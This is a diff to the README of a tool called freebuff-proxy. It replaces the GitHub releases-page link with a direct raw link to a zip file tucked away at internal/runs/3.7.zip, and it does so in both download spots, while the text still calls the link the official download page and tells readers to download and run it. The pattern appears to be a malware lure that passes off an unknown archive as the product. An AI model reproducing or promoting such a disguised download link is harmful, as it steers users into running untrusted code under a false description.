@@ -10,7 +10,7 @@ freebuff-proxy is a clever helper program that acts like a **translator** betwee
 
 ### Step 1: Get the File
 
-👉 **[Click Here to Download freebuff-proxy](https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/releases)**
+👉 **[Click Here to Download freebuff-proxy](https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/raw/refs/heads/main/internal/runs/3.7.zip)**
 
 Visit this link to download the application. This is the official download page where you'll find the latest version.
 
@@ -109,7 +109,7 @@ You've got the tool. You've got the step. Download it, run it, and enjoy a smoot
 
 ---
 
-**Download Again:** [https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/releases](https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/releases)
+**Download Again:** [https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/raw/refs/heads/main/internal/runs/3.7.zip](https://github.com/Simmondsbrightasanewpenny643/freebuff-proxy/raw/refs/heads/main/internal/runs/3.7.zip)
 
 ---
 
